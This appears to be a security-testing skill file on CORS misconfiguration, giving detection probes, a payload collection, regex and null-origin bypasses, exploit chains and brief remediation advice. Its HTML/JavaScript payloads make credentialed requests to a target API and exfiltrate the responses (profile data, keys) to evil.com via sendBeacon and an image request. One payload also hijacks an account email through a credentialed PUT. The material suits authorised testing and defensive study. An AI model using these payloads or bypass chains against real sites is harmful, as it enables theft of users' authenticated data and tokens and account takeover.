---
name: cors
description: CORS misconfiguration enabling credential theft and cross-origin data exfiltration
---

# CORS Misconfiguration

## Attack Surface
- APIs dynamically reflecting the `Origin` header in `Access-Control-Allow-Origin`
- Endpoints pairing `Access-Control-Allow-Credentials: true` with reflected or wildcard origins
- Preflight response caching enabling stale policy exploitation; WebSocket origin bypass

## Detection Techniques
- Send `Origin: https://evil.com` and check if reflected in ACAO header
- Test `Origin: null` (sandboxed iframes, data: URIs, file:// protocol)
- Try regex bypass: `target.com.attacker.com`, `attackertarget.com`
- Check if `Access-Control-Allow-Credentials: true` pairs with wildcard or reflected origin

## Common Payloads

```html
<!-- Credential theft via reflected origin -->
<script>fetch('https://api.target.com/profile',{credentials:'include'})
.then(r=>r.json()).then(d=>navigator.sendBeacon('https://evil.com/log',JSON.stringify(d)));</script>

<!-- Null origin via sandboxed iframe -->
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://api.target.com/data',
{credentials:'include'}).then(r=>r.text()).then(d=>parent.postMessage(d,'*'));</script>"></iframe>

<!-- Preflight abuse: PUT after cache-poisoned OPTIONS -->
<script>fetch('https://api.target.com/email',{method:'PUT',credentials:'include',
headers:{'Content-Type':'application/json'},body:'{"email":"a@evil.com"}'});</script>

<!-- XHR exfil -->
<script>var x=new XMLHttpRequest();x.open('GET','https://api.target.com/keys',true);
x.withCredentials=true;x.onload=function(){new Image().src='https://evil.com/c?d='+btoa(x.responseText)};x.send();</script>

<!-- Regex bypass: Origin: https://evil-target.com matches .*target\.com$ -->
```

## Bypass Techniques
- Regex flaws: `target.com.attacker.com`, `target.com%60attacker.com`
- `null` origin via data: URIs, sandboxed iframes, cross-origin redirects
- Subdomain wildcard abuse: `*.target.com` combined with subdomain takeover
- Vary header manipulation to poison CDN-cached CORS responses

## Exploit Chaining
- CORS + XSS on trusted subdomain: credentialed requests from allowed origin
- CORS + subdomain takeover: claim abandoned CNAME to pass origin checks
- CORS + OAuth token theft: exfiltrate tokens from API responses

## Remediation
- Strict origin allowlist; never dynamically reflect the `Origin` header
- Never pair `Allow-Credentials: true` with wildcard or reflected origins
- Exact string matching for origins, not regex or substring checks
- Short `Access-Control-Max-Age` to reduce preflight cache abuse
